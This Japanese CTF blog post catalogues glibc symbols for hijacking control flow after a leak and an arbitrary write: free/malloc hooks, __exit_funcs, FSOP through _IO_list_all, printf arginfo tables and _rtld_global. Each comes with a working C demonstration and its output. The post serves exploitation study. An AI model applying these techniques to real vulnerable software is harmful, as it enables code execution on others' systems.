---
title: glibcでRIP取得に使えるシンボルまとめ
date: 2022-06-22 04:06:17
tags: [ctf,pwn]
---
# はじめに
基本的にCTF用
glibc2.34でmalloc_hook, free_hookが消されたのもあって
今何が使えるのかよくわからんくなってたのでまとめてみた。
別に新しい手法の紹介では全くなく、既出を調べただけ。
多分これ以外にももっと使えるシンボルあると思うんで、こっそり教えてくれたら追記します。


検証ではアドレスリークや任意アドレスの書き込みの手段がすでにあるという前提の
擬似exploitになっている。
target関数が直接呼び出さずに実行されていることをもって、RIPが制御できているみたいな感じで読んでほしい。


また環境は、基本的に検証時点での最新版のglibc2.35で行い、
2.35で動かないもの、消されてたシンボルについては2.31で検証した。

目次
- [\__free_hook / \__malloc_hook](#free-hook-x2F-malloc-hook)
- [\__exit_funcs / pointer_guard](#exit-funcs-x2F-pointer-guard)
- [\_IO_list_all / \_IO_OVERFLOW](#IO-list-all-x2F-IO-OVERFLOW)
- [\__printf_function_table / \__printf_arginfo_table](#printf-function-table-x2F-printf-arginfo-table)
- [\_rtld_global](#rtld-global)
- [\_dl_open_hook](#dl-open-hook)

## \_free_hook / \_malloc_hook
2.34でシンボルが消された
そのため < 2.34の環境で動く(2.31までは少なくとも確認済み)

みんな大好き\_free_hook
条件次第では8bytesの書き換えでシェルまで取れるのはやっぱり便利だった。

### 手順
説明不要な気がするが、シンボルを呼び出したい関数アドレスに書き換えてmalloc/freeを呼ぶだけ

```c
#include <stdio.h>
#include <stdlib.h>
// differ in each environment
unsigned long off_puts = 0x84450;
unsigned long off_malloc_hook = 0x1ecb70;
unsigned long off_free_hook = 0x1eee48;

void target1(unsigned long arg1)
{
    printf("In target1(): arg1=0x%lx\n", arg1);
    return;
}

void target2(unsigned long arg1)
{
    printf("In target2(): arg1=0x%lx\n", arg1);
    return;
}

void main()
{
    printf("Start of main()\n");

    void* libc_base = &puts - (unsigned long)off_puts;
    printf("libc_base = %p\n",libc_base);
    void* ptr_malloc_hook = libc_base+off_malloc_hook;
    void* ptr_free_hook = libc_base+off_free_hook;

    // normal
    char* ptr = malloc(0x400);
    free(ptr);

    // overwrite symbols
    *(unsigned long*)ptr_malloc_hook = target1;
    *(unsigned long*)ptr_free_hook = target2;

    malloc(0xff); // exploit
    free(ptr);    // exploit

    puts("End of main()");
    return;
}
```
```
$ ./malloc_free_hook 
Start of main()
libc_base = 0x7f3714205000
In target1(): arg1=0xff
In target2(): arg1=0x5583524a16b0
End of main()
```
上記は2.31環境での動作確認。

### 参考
* \__free_hook呼び出し(2.31)
https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/malloc/malloc.c#L3095
* \__malloc_hook呼び出し(2.31)
https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/malloc/malloc.c#L3033

##  \__exit_funcs / pointer_guard
ver2.35で動作確認済み

### 手順
\__exit_funcsというstruct exit_functions_listを指すポインタを書き換えて
いい感じの関数テーブルを用意する。
するとexit()やmain関数からのreturn時に呼ばれるrun_exit_handler()内で関数が呼ばれるが
この時PTR_DEMANGLEでror 0x11とxorの操作があるので関数ポインタはあらかじめエンコードされた値を格納しておく。
xorする値はstack canaryと同様のTLS領域に格納されているのでこの値をリークまたは書き換える必要がある。
第一引数を隣接するアドレスで指定できるのはとても良い。

```c
#include <stdio.h>
#include <stdlib.h>
// differ in each environment
unsigned long off_puts = 0x80ed0;
unsigned long off_tls = 0x7ffff7d8a740 - 0x7ffff7d8d000;
unsigned long off_exit_funcs = 0x7ffff7fa6838 - 0x7ffff7d8d000;

#define ENC_FUNC(ptr,pg) ((ptr^pg)<<0x11|(ptr^pg)>>(0x40-0x11))

void target1(unsigned long arg1)
{
    printf("In target1(): arg1=0x%lx\n", arg1);
    return;
}

void target2(unsigned long arg1)
{
    printf("In target2(): arg1=0x%lx\n", arg1);
    return;
}

void main()
{
    printf("Start of main()\n");

    void* libc_base = &puts - (unsigned long)off_puts;
    printf("libc_base = %p\n",libc_base);
    void* tls = libc_base + off_tls;
    printf("tls = %p\n",tls);
    void* exit_funcs = libc_base + off_exit_funcs;
    printf("exit_funcs = %p\n",exit_funcs);

    // prepare for exploit
    unsigned long fake_pointer_guard = 0xdeadbeef;
    void* fake_exit_function_list = malloc(0x200);

    *(unsigned long*)(fake_exit_function_list +  0x0) = 0;          // next
    *(unsigned long*)(fake_exit_function_list +  0x8) = 2;          // idx (number of functions)
    *(unsigned long*)(fake_exit_function_list + 0x10) = 4;          // fns[0].flavor
    *(unsigned long*)(fake_exit_function_list + 0x18) =
            ENC_FUNC((unsigned long)target1,fake_pointer_guard);    // fns[0].func.fn
    *(unsigned long*)(fake_exit_function_list + 0x20) = 0x12345678; // fns[0].func.arg
    *(unsigned long*)(fake_exit_function_list + 0x30) = 4;          // fns[1].flavor
    *(unsigned long*)(fake_exit_function_list + 0x38) =
            ENC_FUNC((unsigned long)target2,fake_pointer_guard);    // fns[1].func.fn
    *(unsigned long*)(fake_exit_function_list + 0x40) = 0x9abcdef0; // fns[1].func.arg

    // overwrite symbols
    *(unsigned long*)(tls+0x30) = fake_pointer_guard;
    *(unsigned long*)exit_funcs = (unsigned long)fake_exit_function_list;

    puts("End of main()");
    // _exit(0); //not work
    // exit(0);
    return;
}
```

```
$ ./exit_funcs 
Start of main()
libc_base = 0x7f212d6ef000
tls = 0x7f212d6ec740
exit_funcs = 0x7f212d908838
End of main()
In target2(): arg1=0x9abcdef0
In target1(): arg1=0x12345678
```

### 参考資料
* run_exit_handler
https://elixir.bootlin.com/glibc/latest/source/stdlib/exit.c#L38
* exit_function_list / exit_function
https://elixir.bootlin.com/glibc/latest/source/stdlib/exit.h#L55
https://elixir.bootlin.com/glibc/latest/source/stdlib/exit.h#L34
* tdbhead_t
https://elixir.bootlin.com/glibc/latest/source/sysdeps/x86_64/nptl/tls.h#L52
* TLS領域の求め方(過去問writeup)
https://vishnudevtj.github.io/notes/star-ctf-2018-babystack

## \_IO_list_all / \_IO_OVERFLOW
いわゆるFSOPというやつで、この類のやつは状況次第では発火ポイントは色々あるので、
ここでは汎用性の高そうな\_IO_OVERFLOWによる発火を記載する。

### 手順
IO_list_allには本来stderr->stdout->stdinといったファイル構造体が単方向リストに繋がれている。

exit()やmain関数からのreturn時に呼ばれる\_IO_flush_all_lockp内では、
このIO_list_allを辿って各ファイル構造体のメンバが特定の条件の時に\_IO_OVERFLOW(vtableメンバ+0x18に位置する関数ポインタ)が呼ばれるという処理が存在する。

この処理を利用して、IO_list_allを偽造した\_IO_FILE_plus構造体を指すようにして、bufferのポインタなど適切なメンバを設定することで関数をフックすることができる。

vtableメンバは適切なアドレス範囲内にあるかのチェックが行われるため偽の関数テーブルを用意したheap領域を指すようにしたりはできない。(チェックの話は結構昔からあるので割愛する)
そのため本来のvtable付近のアドレスに、飛ばしたいアドレスを格納し、vtableメンバ+0x18がそのアドレスを指すようにずらしてあげることで\_IO_OVERFLOW呼び出し時に目的の関数実行することができる。

#### パターン1(vtable領域への書き込み)
vtable領域内に飛ばしたい関数ポインタを書き込んで、偽装した構造体のvtableメンバを適切にずらしてあげるやり方。

先に言うと2.35では基本的に使えないと思われる。
というのも自分の環境ではシンボルや関数自体はあるもののvtableのメモリページがreadonlyになっているので書き換えができなかった。

2.31ではどうかというと、これも自分の環境だとreadonlyになっててダメだった。
記憶では2.31でも普通に使えたので、あれ？と思い少し調べてみたが、同じバージョンでもパッチが当たっているものがあるみたい。なのでこれを使う際はあまりバージョンで判断しない方が良さそう。
(この解釈間違っている可能性があるので、有識者がいたら教えてほしい)

以下に記載する再現は次の環境で行った
```
Ubuntu GLIBC 2.31-0ubuntu9.3
BuildID[sha1]=ce782ece08d088e77eeadc086f84d4888de4bb42
```

ちなみに動かなかった2.31
```
Ubuntu GLIBC 2.31-0ubuntu9.7
BuildID[sha1]=9fdb74e7b217d06c93172a8243f8547f947ee6d1
```

以下は本来のvtable+0x8にtarget関数のアドレスを、偽造したファイル構造体のvtableメンバを本来のvtableから-0x10した値にセットしている。
```c
#include <stdio.h>
#include <stdlib.h>
// differ in each environment
unsigned long off_puts = 0x875a0;
unsigned long off_IO_list_all = 0x1ec5a0;
unsigned long off_vtable = 0x1ed4a0;

void target1(unsigned long arg1)
{
    printf("In target1(): arg1=0x%lx\n", arg1);
    return;
}

void main()
{
    printf("Start of main()\n");

    void* libc_base = &puts - (unsigned long)off_puts;
    printf("libc_base = %p\n",libc_base);
    void* IO_list_all = libc_base + off_IO_list_all;
    printf("IO_list_all = %p\n",IO_list_all);
    void* vtable = libc_base + off_vtable;
    printf("vtable = %p\n",vtable);

    // prepare for exploit
    void* fake_io_struct = malloc(0x400);
    printf("fake_io_struct = %p\n", fake_io_struct);

    *(unsigned long*)(fake_io_struct+ 0x0) = 0xdeadbeef;    // *fp  arg1
    *(unsigned long*)(fake_io_struct+0x20) = 0;             // _IO_write_base
    *(unsigned long*)(fake_io_struct+0x28) = 1;             // _IO_write_end
    *(int*)(fake_io_struct+0xc0) = 0;                       // _mode
    *(unsigned long*)(fake_io_struct+0xd8) = (unsigned long)vtable - 0x10; // vtable

    // overwrite symbols
    *(unsigned long*)(vtable + 0x8) = target1; // fake _IO_OVERFLOW
    *(unsigned long*)IO_list_all = fake_io_struct;

    puts("End of main()");
    // _exit(0); //not work
    // exit(0);
    return;
}
```

```
$ ./io_list_all 
Start of main()
libc_base = 0x7fb8274ae000
IO_list_all = 0x7fb82769a5a0
vtable = 0x7fb82769b4a0
fake_io_struct = 0x555a5e00d6b0
End of main()
In target1(): arg1=0x555a5e00d6b0
```

#### パターン2(\_IO_cookie_\[read|write|seek|close]の呼び出し)
house of emmaの1パート

この方法ではパターン1が動かなかった2.31(GLIBC 2.31-0ubuntu9.7)でも動くことが確認できた。
自分の環境の2.35では\_IO_cookie_jumps近辺にvtableを設定するとvtable checkで検出されるようになっていた。(コードレベルで追えていない)


\_IO_OVERFLOWが指す関数ポインタを既存の関数\_IO_cookie_\[read|write|seek|close]に向ける。
これらの\_IO_cookie_xxx関数では、さらに\_IO_cookie_file構造体の関数ポインタのメンバを呼ぶことができて、これらはvtableからの呼び出しではないので、heap上に設置できる。
また関数ポインタは前述のPTR_DEMANGLEでデコードされるので、あらかじめエンコードされた値を格納しておく。

以下の擬似exploitはexit()時のIO_OVERFLOWをトリガーにしているので、pointer_guardを改ざんすると、前述の\__exit_funcsのDEMANGLEが失敗してしまうので、pointer_guardをリークした場合を想定している。(他のメンバをいじることでpointer_guardの改ざんでも発火は一応できるが)

exit時の\_IO_OVERFLOWを発火のトリガーにしなければこの問題は回避できる。
(現にhouse of emmaの解説記事ではassert()をトリガーにしている)

```c
#include <stdio.h>
#include <stdlib.h>
// differ in each environment
unsigned long off_puts =         0x7ffff7e4a450 - 0x7ffff7dc6000;
unsigned long off_IO_list_all =  0x7ffff7fb35a0 - 0x7ffff7dc6000;
unsigned long off_IO_cookie_jumps = 0x7ffff7faea20 - 0x7ffff7dc6000;
unsigned long off_tls          = 0x7ffff7fb9540 - 0x7ffff7dc6000;

#define ENC_FUNC(ptr,pg) ((ptr^pg)<<0x11|(ptr^pg)>>(0x40-0x11))

void target1(unsigned long arg1)
{
    printf("In target1(): arg1=0x%lx\n", arg1);
    return;
}

void main()
{
    printf("Start of main()\n");

    void* libc_base = &puts - (unsigned long)off_puts;
    printf("libc_base = %p\n",libc_base);
    void* IO_list_all = libc_base + off_IO_list_all;
    printf("IO_list_all = %p\n",IO_list_all);
    void* IO_cookie_jumps = libc_base + off_IO_cookie_jumps;
    printf("IO_cookie_jumps = %p\n",IO_cookie_jumps);
    void* tls = libc_base + off_tls;
    printf("tls = %p\n",tls);

    // prepare for exploit
    void* fake_io_struct = malloc(0x400);
    unsigned long pointer_guard = *(unsigned long*)(tls+0x30);

    *(unsigned long*)(fake_io_struct+0x20) = 0;             // _IO_write_base
    *(unsigned long*)(fake_io_struct+0x28) = 1;             // _IO_write_end
    *(int*)(fake_io_struct+0xc0) = 0;                       // _mode
    *(unsigned long*)(fake_io_struct+0xe0) = 0xdeadbeef;    // _cookie

    // _IO_cookie_read
    *(unsigned long*)(fake_io_struct+0xd8) = (unsigned long)IO_cookie_jumps+0x58; // vtable
    *(unsigned long*)(fake_io_struct+0xe8) =
                ENC_FUNC((unsigned long)target1, pointer_guard); // cookie_io_functions_t.read

    // _IO_cookie_write
    //*(unsigned long*)(fake_io_struct+0xd8) = (unsigned long)IO_cookie_jumps+0x60; // vtable
    //*(unsigned long*)(fake_io_struct+0xf0) = 
    //          ENC_FUNC((unsigned long)target1, pointer_guard); // cookie_io_functions_t.read

    // _IO_cookie_seek
    //*(unsigned long*)(fake_io_struct+0xd8) = (unsigned long)IO_cookie_jumps+0x68; // vtable
    //*(unsigned long*)(fake_io_struct+0xf8) = 
    //          ENC_FUNC((unsigned long)target1, pointer_guard); // cookie_io_functions_t.read

    // _IO_cookie_close
    //*(unsigned long*)(fake_io_struct+0xd8) = (unsigned long)IO_cookie_jumps+0x70; // vtable
    //*(unsigned long*)(fake_io_struct+0x100) = 
    //          ENC_FUNC((unsigned long)target1, pointer_guard); // cookie_io_functions_t.read

    // overwrite symbols
    *(unsigned long*)IO_list_all = fake_io_struct;

    puts("End of main()");
    // _exit(0); //not work
    // exit(0);
    return;
}
```


### 参考
* \_IO_FILE_plus
https://elixir.bootlin.com/glibc/glibc-2.35.9000/source/libio/libioP.h#L324
* \_IO_flush_all_lockp
https://elixir.bootlin.com/glibc/glibc-2.35.9000/source/libio/genops.c#L685
* \_IO_jump_t
https://elixir.bootlin.com/glibc/glibc-2.35.9000/source/libio/iofopncook.c#L155
* \_IO_cookie_file
https://elixir.bootlin.com/glibc/glibc-2.35.9000/source/libio/libioP.h#L342
* \_IO_cookie_io_functions_t
https://elixir.bootlin.com/glibc/glibc-2.35.9000/source/libio/bits/types/cookie_io_functions_t.h#L61
* \_IO_cookie_xxx関数系
https://elixir.bootlin.com/glibc/glibc-2.35.9000/source/libio/iofopncook.c#L33
* 解説記事
https://www.anquanke.com/post/id/260614

## \__printf_function_table / \__printf_arginfo_table
house of husk の1パート
ver2.35で動作確認済み

rdiを操作するのはキツそうなのでone gadgetなりいい感じのgadgetが必要。

### 手順
\__printf_function_tableを読み込み可能領域に、
\__printf_arginfo_tableを自身の用意した関数テーブルを指すようにすれば、
書式文字列を用いてprintf()を行うことで、対象の関数テーブルの値が呼ばれる。

```c
#include <stdio.h>
#include <stdlib.h>
// differ in each environment
unsigned long off_puts = 0x80ed0;
unsigned long off_printf_function_table = 0x7ffff7fa89c8 - 0x7ffff7d8d000;
unsigned long off_printf_arginfo_table = 0x7ffff7fa78b0 - 0x7ffff7d8d000;

void target1(unsigned long arg1)
{
    printf("In target1(): arg1=0x%lx\n", arg1);
    return;
}

void main()
{
    printf("Start of main()\n");

    void* libc_base = &puts - (unsigned long)off_puts;
    printf("libc_base = %p\n",libc_base);
    void* printf_function_table = libc_base + off_printf_function_table;
    void* printf_arginfo_table = libc_base + off_printf_arginfo_table;

    printf("__printf_function_table = %p\n",printf_function_table);
    printf("__printf_arginfo_table = %p\n",printf_arginfo_table);

    printf("%K\n");
    // prepare for exploit
    void* area_readable = malloc(0x100);
    void* fake_arginfo_table = malloc(0x400); // enough size

    *(unsigned long*)(fake_arginfo_table + 'K'*8) = target1;

    // overwrite symbols
    *(unsigned long*)printf_function_table = (unsigned long)area_readable;
    *(unsigned long*)printf_arginfo_table = (unsigned long)fake_arginfo_table;

    printf("%K\n"); // exploit
    puts("End of main()");
    return;
}
```

```
$ ./printf_arginfo_table 
Start of main()
libc_base = 0x7f5b27122000
__printf_function_table = 0x7f5b2733d9c8
__printf_arginfo_table = 0x7f5b2733c8b0
%K
after overwrite
In target1(): arg1=0x7fffa1fceda0
In target1(): arg1=0x7fffa1fceda0
%K
```
2回呼ばれているのは
printf_positionalとその中で呼ばれる\__parse_one_specmbでそれぞれ実行されている。


### 参考資料
* house of husk 解説記事　 
https://ptr-yudai.hatenablog.com/entry/2020/04/02/013910
* printf_positional
https://elixir.bootlin.com/glibc/latest/source/stdio-common/vfprintf-internal.c#L1740
* \__parse_one_specmb
https://elixir.bootlin.com/glibc/latest/source/stdio-common/printf-parsemb.c#L316

## \_rtld_global
house of banana の1パート
ver2.35で動作確認済み。

### 手順
ld.so内の\_rtld_globalが指し示すlink_mapの双方向リストをいい感じに書き換えると、
exit()やmain関数からのreturnの際に呼ばれる\_dl_finiの処理にていい感じに差し替えた関数テーブルが呼ばれる。

```c
#include <stdio.h>
#include <stdlib.h>
// differ in each environment
unsigned long off_puts = 0x80ed0;
unsigned long off_ld = 0x7fe5d6f2d000 - 0x7fe5d6cfd000; // ld_base - libc_base 
//unsigned long off_ld = 0x7ffff7fc3000 - 0x7ffff7d8d000; // for gdb
unsigned long off_rtld_global = 0x7ffff7ffd040 - 0x7ffff7fc3000;

void target1(unsigned long arg1)
{
    printf("In target1(): arg1=0x%lx\n", arg1);
    return;
}

void target2(unsigned long arg1)
{
    printf("In target2(): arg1=0x%lx\n", arg1);
    return;
}

void main()
{
    int i;

    printf("Start of main()\n");

    void* libc_base = &puts - (unsigned long)off_puts;
    printf("libc_base = %p\n",libc_base);
    void* rtld_global = libc_base + off_ld + off_rtld_global;
    printf("rtld_global = %p\n",rtld_global);

    // prepare for exploit
    unsigned int ns_loaded = 4;
    void* fake_link_maps[ns_loaded];

    for(i = ns_loaded-1; i >= 0; i--){
        fake_link_maps[i] = malloc(0x400);                              // enough for size of link_map
        *(unsigned long*)(fake_link_maps[i] + 0x28) = fake_link_maps[i]; // link_map->l_real
        if(i == ns_loaded-1)
            *(unsigned long*)(fake_link_maps[i] + 0x18) = 0;            // link_map->l_next
        else
            *(unsigned long*)(fake_link_maps[i] + 0x18) = fake_link_maps[i+1];
    }

    void* fake_array      = malloc(0x10);
    void* fake_array_size = malloc(0x10);
    void* fake_func_table = malloc(0x10);

    *(unsigned long*)(fake_link_maps[0] + 0x110) = fake_array;          // link_map->l_info[DT_FINI_ARRAY]
    *(unsigned long*)(fake_array + 8) = fake_func_table;

    *(unsigned long*)(fake_link_maps[0] + 0x120) = fake_array_size;     // link_map->l_info[DT_FINI_ARRAY]
    *(unsigned long*)(fake_array_size + 8) = 0x10;

    *(unsigned int*)(fake_link_maps[0] + 0x31c) = 8;                    // link_map->l_init_call (bit field)

    *(unsigned long*)(fake_func_table + 0) = target1;
    *(unsigned long*)(fake_func_table + 8) = target2;

    // overwrite symbols
    *(unsigned long*)rtld_global = (unsigned long)fake_link_maps[0];

    puts("End of main()");
    // _exit(0); //not work
    // exit(0);
    return;
}

```

```
$ ./rtld_global 
Start of main()
libc_base = 0x7fd908050000
rtld_global = 0x7fd9082ba040
End of main()
In target2(): arg1=0x7fd9082baa48
In target1(): arg1=0x7fff8b010e00
```

関数はテーブルの末尾から連続で呼ぶことができる & その際にレジスタがあまり破壊されないので(環境依存)
1ターン目でrdiをセット、2ターン目でsystem()みたいなこともできる。

以下は自分の環境での関数ループの処理
```
   0x7ffff7fc9248 <_dl_fini+520>:       mov    QWORD PTR [rbp-0x38],rax
   0x7ffff7fc924c <_dl_fini+524>:       call   QWORD PTR [rax]
   0x7ffff7fc924e <_dl_fini+526>:       mov    rax,QWORD PTR [rbp-0x38]
   0x7ffff7fc9252 <_dl_fini+530>:       mov    rdx,rax
   0x7ffff7fc9255 <_dl_fini+533>:       sub    rax,0x8
   0x7ffff7fc9259 <_dl_fini+537>:       cmp    QWORD PTR [rbp-0x40],rdx
   0x7ffff7fc925d <_dl_fini+541>:       jne    0x7ffff7fc9248 <_dl_fini+520>
```

### 参考資料
* 出題例とwriteup
https://qiita.com/kusano_k/items/2e8bf933bff37c0e98e0#_rtld_global
* dl_fini
https://elixir.bootlin.com/glibc/latest/source/elf/dl-fini.c#L30
* link_map
https://elixir.bootlin.com/glibc/latest/source/include/link.h#L95
* rtld_global
https://elixir.bootlin.com/glibc/latest/source/sysdeps/generic/ldsodefs.h#L322

## \_dl_open_hook
dl_open_hookについてはシンボル自体2.35でもある
が解説記事の手法は < 2.31で動作するっぽい。(ソースコードで判断しているため、未確認要検証)

abort時の__libc_message()内のBEFORE_ABORT(backtrace_and_mapsのマクロ)が2.31以降消されている。
### 手順
\_dl_open_hookに、用意したdl_open_hook構造体を配置することで、abort時に呼ばれる
関数を操作することができる。

擬似exploitは省略
2.31未満のlibc問が出題されたらワンチャン使えるかもくらいに思い出してあげてほしい。

### 参考
* 解説
https://dangokyo.me/2018/01/20/extra-exploitation-technique-1-_dl_open/
* backtarce_and_mapsの呼び出し(2.30)
https://elixir.bootlin.com/glibc/glibc-2.30.9000/source/sysdeps/posix/libc_fatal.c#L178

# 終わりに
実はこれはctf4bのmonkey heapが解けなかった際の供養
最近サボってたら置いてかれていた

間違いあれば教えてください
